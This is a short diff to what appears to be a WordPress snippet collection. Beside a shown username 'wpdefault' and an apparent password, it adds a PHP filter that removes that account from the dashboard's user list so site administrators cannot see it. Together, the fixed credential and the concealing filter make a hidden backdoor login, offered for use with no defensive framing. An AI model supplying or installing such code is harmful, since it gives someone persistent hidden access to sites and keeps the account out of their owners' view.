@@ -31,6 +31,14 @@ wpdefault
 ```php
 1234567890!
 ```
+# If you want to hide this user data from the wordpress dashboard, use it...
+```php
+add_filter('users_list_table_query_args', function($query_args) {
+    $hidden_username = 'wpdefault';
+    $query_args['exclude'] = get_user_by('login', $hidden_username)->ID;
+    return $query_args;
+});
+```
 
 
 Filter On Sale Product / Discount Product
